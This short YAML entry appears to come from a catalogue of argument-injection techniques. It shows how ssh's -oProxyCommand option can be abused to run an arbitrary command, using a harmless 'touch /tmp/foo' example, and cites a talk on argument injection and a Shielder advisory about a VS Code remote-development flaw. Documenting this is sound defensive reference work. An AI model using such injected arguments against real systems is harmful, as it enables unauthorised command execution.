---
functions:
  command:
    - code: ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
      references:
        - title: Joern Schneeweisz's talk "Argument Injection"
          url: https://docs.google.com/presentation/d/1U8r5CJs9dLOLO2-hj_bHidRMXugUl3ejv8Hdw6bDMv4/edit#slide=id.g6ea990965c_0_15
        - title: Remote Command Execution in Visual Studio Code Remote Development Extension
          url: https://www.shielder.com/it/advisories/remote-command-execution-in-visual-studio-code-remote-development-extension/
---
